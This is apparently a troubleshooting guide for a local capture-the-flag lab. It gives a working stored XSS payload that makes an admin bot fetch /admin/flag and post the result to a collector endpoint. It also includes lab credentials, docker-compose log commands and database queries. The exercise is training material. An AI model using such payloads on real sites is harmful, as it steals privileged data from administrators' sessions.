# Debugging Guide: Flag Not Being Captured

If you're not receiving the flag after submitting your XSS payload, follow these steps:

## Step 1: Verify Your Payload

Make sure your payload is exactly this (copy-paste to avoid typos):

```html
<script>
fetch('/admin/flag')
  .then(r => r.text())
  .then(flag => {
    fetch('/collector', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ user_id: 1, data: flag })
    });
  });
</script>
```

**Common mistakes:**
- Missing quotes around strings
- Wrong user_id (should be 1 for Tokyo)
- Missing semicolons
- Wrong endpoint names

## Step 2: Check Server Logs

View the web server logs to see if requests are being received:

```bash
sudo docker-compose logs web --tail 50
```

Look for:
- `[collector] Received request` - confirms the collector endpoint was hit
- `[collector] Flag detected` - confirms a flag was received
- Any error messages

## Step 3: Check Bot Logs

View the bot logs to see if it's visiting the admin page:

```bash
sudo docker-compose logs admin-bot --tail 50
```

Look for:
- `[professor-bot] The Professor reviewed all messages` - confirms bot is running
- `[professor-bot] Detected request: POST /collector` - confirms XSS executed
- `[professor-bot] Response: 200 /collector` - confirms collector responded
- Any error messages

## Step 4: Verify Your User ID

Your user_id might not be 1. Test with this payload first:

```html
<script>
fetch('/collector', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ user_id: 1, data: 'TEST_USER_ID_1' })
});
</script>
```

Then check `/my-captures` - if you see "TEST_USER_ID_1", your user_id is 1. If not, try 2, 3, etc.

## Step 5: Wait Long Enough

The bot runs every 8 seconds. After submitting your payload:
1. Wait at least 15-20 seconds
2. Check `/my-captures` again
3. The bot needs time to:
   - Log in
   - Navigate to `/admin/tickets`
   - Execute your JavaScript
   - Make network requests

## Step 6: Verify Flag Endpoint Exists

Test if the flag endpoint is accessible (you'll get 403, but that confirms it exists):

```bash
curl http://localhost:5002/admin/flag
```

You should get a 403 Forbidden (not 404), which confirms the endpoint exists.

## Step 7: Check Database

If you have database access, verify the flag was stored:

```bash
sudo docker-compose exec db psql -U ctf -d ctfdb -c "SELECT * FROM captures ORDER BY id DESC LIMIT 5;"
```

## Common Issues and Solutions

### Issue: "Invalid credentials" when logging in
**Solution:** Make sure you're using `tokyo` / `rio123` (from robots.txt)

### Issue: Bot not running
**Solution:** 
```bash
sudo docker-compose restart admin-bot
sudo docker-compose logs admin-bot
```

### Issue: No requests in logs
**Solution:** 
- Verify your payload syntax is correct
- Make sure you're submitting it as the message content (not subject)
- Check that the message was saved successfully

### Issue: Collector receives request but no flag
**Solution:**
- Check the `data` field in logs - is it the actual flag?
- Verify FLAG environment variable is set: `sudo docker-compose exec web printenv FLAG`
- Check if flag format matches: should start with `FLAG{`

### Issue: Flag already captured
**Solution:** This is normal - the system prevents duplicates. Check `/my-captures` - the flag should already be there.

## Still Not Working?

1. **Rebuild containers:**
   ```bash
   sudo docker-compose down
   sudo docker-compose up --build -d
   ```

2. **Check all services are running:**
   ```bash
   sudo docker-compose ps
   ```
   All services should show "Up"

3. **Verify environment variables:**
   ```bash
   sudo docker-compose exec web printenv | grep FLAG
   ```

4. **Try a simpler test payload:**
   ```html
   <script>
   alert('XSS works!');
   </script>
   ```
   If this doesn't execute (check bot logs for console output), there's a deeper issue.

